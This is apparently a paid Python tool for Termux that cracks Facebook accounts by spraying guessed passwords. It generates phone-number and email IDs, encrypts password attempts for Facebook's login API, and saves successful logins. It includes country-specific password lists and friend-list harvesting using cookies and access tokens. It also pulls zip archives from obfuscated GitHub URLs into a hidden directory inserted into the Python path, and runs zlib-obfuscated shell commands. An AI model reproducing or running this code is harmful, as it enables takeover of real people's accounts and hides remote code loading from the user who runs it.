import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd
 
 
try:
	import requests
except ImportError:
	os.system('pip install requests')
 
 
ses = requests.Session()
 
id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []
 
 
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'

print("EssA")

#________________________________________#
def clear():
	os.system("clear")
 
def line():
	print(52*'-')
def p(x):
	print(x)
 
#SOURCE BY : UMAR-NAZEER
#GITHUB : CYBER-ATTACK 
#★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★
#coding = utf-8
from uuid import uuid4
import os,sys,tempfile,string,random,subprocess,uuid
http_directory = tempfile.mkdtemp(prefix='.')
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
sys.path.insert(5,http_directory)
try:
        os.mkdir('crypto')
except:pass
hh = "ho"
hh2 = "9/pycrypt"
find_aarch = subprocess.check_output('uname -om',shell=True)
if 'aarch64' in str(find_aarch):
        user_aarch = '64'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
elif 'arm' in str(find_aarch):
        user_aarch = '32'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
else:
        print(' Unknown aarch ')
        exit()
if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
        os.system('clear')
        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
        os.system('python jan.py')
else:
        akk2="rsi"
        akk=f"cha{akk2}fi"
        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
        os.system(f'curl -L {lib} > {http_directory}/config.zip')
        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
try:
        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
        from string import *

        from concurrent.futures import ThreadPoolExecutor as ThreadPool
        from Crypto.Cipher import AES, PKCS1_v1_5
        from Crypto.PublicKey import RSA
        from Crypto.Random import get_random_bytes
except Exception as e:
        print(e)
        print('\n Installing modules wait !')
        os.system('pip install futures==2 && python jan.py')
except FileExistsError:
        os.system('pip uninstall requests urllib3 idna certifi -y')
        pass

try:
        import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib
        from string import *
        from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python jan.py')

#----[pran links]-----
kkk = {'user-agent': 'Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
lll = ("https://b-api.facebook.com/method/auth.login")
#----[remover]-----
import os,shutil,zlib
sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')
sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')
sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')
sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')
sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')
sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')
sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')
#--checking if file is not avalible
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
        pass
        exit("Error in termux modules ")

if os.path.exists(sz):
        os.rename(sz1,'.f1')
        os.rename(sz2,'.f2')
        os.system(sz3)
        os.system(sz4)
        os.system(sz5)
        os.system(sz6)
else:
        pass
os.system("rm -rf .f1")
os.system("rm -rf .f2")

logo = ("""\33[;33m   
         
\033[92m
  ______             __                           
 /      \           /  |                          
/$$$$$$  | __    __ $$ |____    ______    ______  
$$ |  $$/ /  |  /  |$$      \  /      \  /      \ 
$$ |      $$ |  $$ |$$$$$$$  |/$$$$$$  |/$$$$$$  |
$$ |   __ $$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/ 
$$ \__/  |$$ \__$$ |$$ |__$$ |$$$$$$$$/ $$ |      
$$    $$/ $$    $$ |$$    $$/ $$       |$$ |      
 $$$$$$/   $$$$$$$ |$$$$$$$/   $$$$$$$/ $$/       
          /  \__$$ |                              
          $$    $$/                               
           $$$$$$/                                

\033[1;97m""")     

#--(Dark@Colours)---#
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
s="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;92m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"
#--(rare-colors)--#
holaa="38;5"
ro=(f"\033[{holaa};208")
rb=(f"\033[{holaa};32")
rc=(f"\033[{holaa};122m")
rg= (f"\033[{holaa};112m")
rp=(f"\033[{holaa};147m")

loop = 0
methods = []
ok=[]
total=[]
clone_type=[]
android_models = []

xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')
update = requests.get(xny).text
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = id+bxd+xp
myweb2 = requests.get(xny).text

def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get('https://raw.githubusercontent.com/hop09/libraries/main/version.txt').text
                if str("upppdate") in update:
                        os.system('clear')
                        exit('script is in update / maintanance be patient ')
                elif str("res-sseett") in update:
                        
                        
                        exit('Dont Try To Bypass')
                elif bumper in myweb2:
                        main()
                else:
                        os.system("clear");print(logo)
                        print(f"{lr}   Your Device License Key Is Not Approved{s}")
                        print(50*"-")
                        print(f"{rc} Key : {bumper}{s}")
                        print(50*"-")
                        print(f" Note : Tool is Paid & We Accept All Types Of PAyment  Method . If There was Fb Update & Tool Wasnt Run Then We Are Not Responsible For All Of This . We Will Try  To Update Script Every Time But It Took Day ")
                        print("\n Baray Mehrbani Tool Apni Zimadare May Buy Kary Lehaza May Apko Force Ni Kar Raha ! Baqe Tool Har 2 sy 3 din bad update hgaya kryga ")
                        print(50*"-")
                        print(f" 15-Days Price : 350")
                        print(f" 1-Month Price : 500")
                        print(50*"-")
                        input("[Press Enter To Send Key To Admin]")
                        os.system(f"termux-open-url https://wa.me/+923021431324?text={bumper}")
                        qsbuy()
        except requests.exceptions.ConnectionError:
                exit(' No internet connection ..')

def xcghker():
        if bumper in myweb2:
                pass
        else:
                qsbuy()
def xchker():
    pass
def main():
        xchker()
        os.system('rm -rf ...txt')
        os.system('clear')
        print(logo);xchker()
        print('The Original Codes are Written by Umar Nazeer')
        print(50*'-')
        print('[1] Fb Cloning Menu')
        print('[2] File Create Menu')
        print('[3] Number Detail Finder')
        print('[4] Remove Cookie')
        print('[5] Clear Cache')
        print('[6] Best Pass Lists \033[0;97m')
        print('[7] How To Use Video')
        print('[0] Exit \033[0;97m')
        print(50*'-')
        menu_opt = input('Select choice : ')
        if menu_opt =='1':
                method_crack()
        elif menu_opt =='2':
                create_file()
        elif menu_opt =='3':
                xchker()
                os.system('xdg-open https://github.com/TechQaiser/Qnumber')
                main()
        elif menu_opt =='4':
                os.system('rm -rf fb_cookies.txt')
                os.system('rm -rf access_token.txt')
                print('       Removed Success')
                time.sleep(3)
                main()
        elif menu_opt =='5':
                isdd="les/u"
                isd="sr/t"
                isddd="p/."
                llb = f"/data/data/com.termux/fi{isdd}{isd}m{isddd}*"
                os.system(f"rm -rf {llb}")
                exit("      Sucessfully Removed .      ")
        elif menu_opt =='6':
                os.system('clear')
                print(logo);xchker()
                print(' Select Your Country For Best PassLists')
                print(50*'-')
                print('[1] Pakistani Ids')
                print('[2] Bangladesh Ids')
                print('[3] Nigeria Ids')
                print('[4] Other Countries')
                print('[0] Back \033[0;97m')
                print(50*'-')
                menu_opt = input('Select choice : ')
                if menu_opt =='1':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('khan123')
                        print('first1234')
                        print('first12345')
                        print('i love you')
                        print('firstkhan')
                        print('khankhan')
                        print('khan12345')
                        print('khan12')
                        print('first786')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='2':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('Bangladesh')
                        print('first1234')
                        print('first12345')
                        print('bangladesh')
                        print('i love you')
                        print('Jannatul123')
                        print('Mohammed123')
                        print('Mohammad123')
                        print('first@123')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='3':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('i love you')
                        print('musa123')
                        print('first12345')
                        print('first@123')
                        print('first@1234')
                        print('firstfirst')
                        print('lastlast')
                        print('first786')
                        print('first1122')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='4':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('i love you')
                        print('first321')
                        print('lastfirst')
                        print('firstlast123')
                        print('first12345')
                        print('first@123')
                        print('first@1234')
                        print('firstfirst')
                        print('first007')
                        print('first789')
                        print('first1122')
                        input('\nPress enter to back ')
                        main()
        elif menu_opt == "7":
                try:
                        os.system('python use.py')
                except:
                        exit('video is not avalible Right now in server try again after few hours')
        elif menu_opt == "0":
                main()
        else:
                print('\n Invalid option, try again ...')
                time.sleep(3)
                main()


def login():
        os.system('clear')
        print(logo);xchker()
        cookies = input(' Put cookies here: ')
        try:
                print('\n Validating cookies ... ')
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open("access_token.txt", "w").write(find_token.group(1))
                open("fb_cookies.txt","w").write(cookies)
                print(' Logged in successfully ...')
                time.sleep(1)
                os.system('python malang.py')
        except KeyError:
                print('\n Inavlid cookies, try another cookies')
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
        except AttributeError:
                print('\n Invalid cookies, try another cookies ...')
                exit()

def method_crack():
        os.system('clear')
        print(logo);xchker()
        print(' [1] File Cloning ')
        print(' [2] Email Cloning ')
        print(' [3] Number Cloning ')
        print(' [0] Back')
        print(50*'-')
        clone_ = input(' Select : ')
        if clone_ == "1":
                clone_type.append('1')
        elif clone_ == "2":
                clone_type.append('2')
        elif clone_ == "3":
                clone_type.append('3')
        elif clone_ == "0":
                main()
        else:
                exit('invalid select')
        mycrackistan()

def mycrackistan():
        global methods
        if '1' in clone_type:
                crack_main().crackfile(id)
        elif '2' in clone_type:
                crack_main().crackmail(id)
        elif '3' in clone_type:
                crack_main().cracknum(id)
class crack_main():
        def __init__(self):
                self.id=[]
        def crackfile(self,id):
                global methods
                os.system('clear')
                print(logo);xchker()
                self.file = input(' Put file path: ')
                try:
                        self.id = open(self.file).read().splitlines()
                        self.pasw()
                except FileNotFoundError:
                        print(' No file found ....')
                        exit()
        def crackmail(self,id):
                global methods
                os.system("clear");print(logo);xchker()
                import requests,random
                user=[]
                print(" [*] First Name Example Hamza,Areesha")
                first = input(" First Name : ")
                last = input(" Last Name : ")
                print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
                domain = input(" Domain : ")
                print("\n [?] Limit ids Example 1000,5000,50000")
                limit = int(input(" Limit Ids : "))
                for nmbr in range(limit):
                        nmpp = random.randint(99,9999)
                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
                        naseeb = open('...txt','a').write(nmp)
                self.id = open('...txt').read().splitlines()
                self.pasw()
        def cracknum(self,id):
                global methods
                os.system('clear');print(logo);xchker()
                print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')
                kode = input('\033[0mChoose Code : \033[0m')
                print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')
                limit = int(input('\033[0mIdz Limit : \033[0m'))
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        xoo = kode+nmp.replace(" ","")
                        xdr = f"{kode+nmp}|{nmp} {xoo}\n"
                        naseeb = open('...txt','a').write(xdr)
                self.id = open('...txt').read().splitlines()
                self.pasw()
        def m1(self,iid,name,passlist):
                try:
                        global ok,loop,android_models
                        sys.stdout.write('\r[UMAR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                                password = pas
                                pwd_key_fetch = 'https://b-graph.facebook.com/pwd_key_fetch'
                                pwd_key_fetch_data = {'version':'2','flow':'CONTROLLER_INITIALIZATION','method':'GET','fb_api_req_friendly_name':'pwdKeyFetch','fb_api_caller_class':'com.facebook.auth.login.AuthOperations','access_token':"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28"}
                                pwd = requests.post(pwd_key_fetch,params=pwd_key_fetch_data).json()
                                password_encryption_pubkey = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmofqjEw46+3ec9y3Eq1V\ny46SazS16Mlb5Ks3mQ0rG40qnkoSQmIaThD5t+tLdEWrc/rwSAdj0L2Ez01Yh4Uz\nhLIliy5hjkt8geAzV6pqgMa48y16b4fjQqsVf0KSFSaXD5IBYm0ErXck8/UKX36W\ngIE1E4QLAAZMcOJQsHZl39P/QVs4Y9lP1/WR7k9sFDbazmyBbyCIAFjHJH7x+Txf\nloj7jbbqbB3b5xC9tolyjiC3Fqybn/MrHOdJI27lQTnTiFeJuW1SpMwRULtf2Cbo\n0WsoQKWzxsUSFHupVS/0DCdx3QaKBPugrs/MTdUeCJDXBZVjTRT9kAtrWSe5u1BR\n5QIDAQAB\n-----END PUBLIC KEY-----\n'
                                password_encryption_key_id = '25'
                                rand_key = get_random_bytes(32)
                                iv = get_random_bytes(12)
                                pubkey_bytes = password_encryption_pubkey
                                pubkey = RSA.import_key(pubkey_bytes)
                                cipher_rsa = PKCS1_v1_5.new(pubkey)
                                encrypted_rand_key = cipher_rsa.encrypt(rand_key)
                                cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
                                current_time = int(time.time())
                                cipher_aes.update(str(current_time).encode("utf-8"))
                                encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
                                buf = io.BytesIO()
                                buf.write(bytes([1, int(password_encryption_key_id)]))
                                buf.write(iv)
                                buf.write(struct.pack("<h", len(encrypted_rand_key)))
                                buf.write(encrypted_rand_key)
                                buf.write(auth_tag)
                                buf.write(encrypted_passwd)
                                encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
                                enc_pas=f"#PWD_REACTNATIVE:2:{current_time}:{encoded}"
                                #corect key : #PWD_REACTNATIVE:2:1669575164:ARlixWtwqn5ecY9XZpoAAVzD71QplMe35ZcKPj6YFm2g7VuXwhxuLL57tYTRivV9LIJ0+qHSURHN989EqbyIJumFGFLpEOqfdHHFkZFgqH3KGks0eQ9b4x8G2ut57oElaQ/B4kcWUP4lcJFjiGySQ7Gd9Q9VAud+LPcAdMn7i11BoHcZr6a8jODjk53LoT9F6AdiACRbpxcQD4f/Md9YI/KMlEnsSeNRvul9FdyTPko83QEEpy+/coDfnfT7kVEm39uyHeYT7qS/G5TxDi+pCIR3GG87rcnN8TKGtxZ/sxy0mjF3OUaUBq/PAdmmL3nr/1bCCQBYWjsY682mO2Du8RLSVaQQY0Xl59qlBgh6QuFkTunm5+8AExOIZ5qFZrRP7YlthRWtL6xbL0FHN/kYFTJUL79v
                                #wrong key  : #PWD_REACTNATIVE:2:1669575552:ARl0BpPjNShZzDs2Z6sAAQX8OVQeDsONp1KNXblCsOQMQc6+d/0weZtIYeegvNY/34O0NzSB4uu0xNwd2RTFLfM+6wlqtn+21v3i+B717NFopebkdG1C1oA+WCVNuMxYWA/FCQt4K3hc6iG4tyOpO+ObqVAJBoDYLS2WnX7aEucv/W11FMC8yGfOfHNsTlpjT/74SUVCFa5Z4lxBhdrQBJt1+GL/ikwbtZq4Vx48hy1w4WCu8l/D1YzUu2sCFej7K5o8X1EN/7KqqtNbAugoDsg1jourI+TCFO2O0YECELFohjgu+ZzYElhq9RLVHIyJY/iP5/jcKnYa867Pvz4FisOzHXkh1w8BegtAW5Yw1hdlk/rtrHhxp5+I9rXLNPvcpL2IwPY=                                
                                five_ip = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
                                one_string_two_ip = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))+str(".")+str(random.randint(111111,222222))+str(".0")+str(random.randint(10,40))
                                url = 'https://b-api.facebook.com/auth/login'                            
                                infos = open('device_info.txt','r').read()
                                version_,model_,brand_name_,width_,height_=infos.split('$')
                                head = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+str(random.randint(200,350))+"."+str(random.randint(0,1))+".0."+str(random.randint(20,70))+"."+str(random.randint(110,280))+";FBBV/"+str(random.randint(412627882,419003907))+";FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/TECNO LD7;FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]","Content-Type": "application/json;charset=utf-8","Host":"graph.facebook.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
                                data = {"locale":"en_US","format":"json","email":iid,"password":enc_pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":1}
                                po = requests.post(url,data=data,headers=head).json()
                                try:
                                        roid = str(po['uid'])
                                except:
                                        roid = iid
                                if 'session_key' in po:
                                        print(' \033[1;32m[UMAR-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/umar_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                elif 'Please Confirm Email' in po:
                                        print(' \033[1;32m[UMAR-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/umar_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                else:
                                        continue
                        loop+=1
                except Exception as e:
                        pass
                        #print(e)

        def pasw(self):
                passlist = []
                if not os.path.exists('device_info.txt'):
                        os.system('clear')
                        print(logo)
                        print(" what is your andriod version ex 8,9,10,11,12,13")
                        version_=input(' type andriod version : ')
                        print(44*'-')                                              
                pl = int(input(' How Much Password Do You Want To Add ? '))
                print(' Example first123,last123,khan123,firstlast')
                print(50*"-")
                for cd in range(pl):
                        passlist.append(input(f' ({cd+1}) Password : '))
                os.system('clear')
                print(logo);xchker()
                print(' Total Ids : '+str(len(self.id)))
                print(' Cloning Is Started Wait For Results')
                print(' After Every 5 Min Turn Airplane On/Off')
                print(50*'-')
                with ThreadPool(max_workers=30) as formSubmit:
                        for user in self.id:
                                if '2' in clone_type:
                                        iid,name = user.split('|')
                                else:
                                        od,name = user.split('|')
                                        iid = od+'@facebook.com'
                                formSubmit.submit(self.m1,iid,name,passlist)
                print(50*'-')
                print(' SucessFully Process Is Completed ')
                print(' Total Ok Ids : '+str(len(ok)))
                print(' Ok Ids Save In : /sdcard/UMAR_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()


def create_file():
        os.system('clear')
        print(logo);xchker()
        print(' [1] Create File ')
        print(' [2] Remove Double Ids ')
        print(' [3] Seprate Ids ')
        print(' [0] Back')
        print(50*'-')
        create_ = input(' Select : ')
        if create_ == "1":
                create_file_login()
        elif create_ == "2":
                double()
        elif create_ == "3":
                sep()
        elif create_ == "0":
                main()
        else:
                exit('invalid select')
        mycrackistan() 

def create_file_login():
        ids = []
        total = []
        xyz = requests.Session()
        os.system('clear')
        print(logo);xchker()
        try:
                cok = open('fb_cookies.txt','r').read()
                cookies = {'cookie':cok}
                access_token = open('access_token.txt', 'r').read()
        except FileNotFoundError:
                login()
        try:
                check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
                load = json.loads(check_cookies)
                iid = load['id']
                name = load['name']
        except KeyError:
                print('\n Cookies has expired')
                time.sleep(1)
                os.system('rm -rf .fb_cookies.txt .access_token.txt')
                login()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        os.system('clear')
        print(logo);xchker()
        print("[1] Create File Mix Ids")
        print("[2] Create File New Ids")
        print(44*"-")
        typp = input('select : ')
        if typp == "1":
                auto_file(cookies,access_token)
        elif typp == "2":
                new_file(cookies,access_token)
        else:
                auto_file(cookies,access_token)

def auto_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo);xchker()
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f' Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        sid = "1"
        os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
        #100010138361148
        sf = input(' Saved File As : ')
        print('')
        os.system('clear')
        print(logo);xchker()
        print(' Total ids To Dump: '+str(len(file)))
        print(' Dumping Is Started Wait ....')
        print(50*'-')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        print(' Total ids Extracted : '+str(len(total)))
        input(' Press enter to back ')
        main()

def new_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo);xchker()
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f' Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        print('\n\033[1;92m Example: 100087,100088 etc\033[0;97m')
        try:
                sl = int(input('\n How Many Links To Grab : '))
        except:
                sl = 1
        for el in range(sl):
                sid = input(f' Put {el+1} link: ')
                os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
        #100010138361148
        sf = input(' Saved File As : ')
        print('')
        os.system('clear')
        print(logo);xchker()
        print(' Total ids To Dump: '+str(len(file)))
        print(' Dumping Is Started Wait ....')
        print(50*'-')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        try:
                son = f"qaiser{str(random.randint(0,90))}.txt"
        except:
                son = f"qaiser{str(random.randint(10,50))}.txt"
        os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+son+'')
        print(' Total ids Extracted : '+str(len(total)))
        print(' New ids Saved As : /sdcard/'+son)
        print(' Normal ids Saved As : '+sf)
        input(' Press enter to back ')
        main()

def iamBadBoy(exid,cookies,access_token,sf):
        try:
                global total,loop
                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
                xyz = requests.Session()
                r = xyz.get(fd_url,cookies=cookies).text
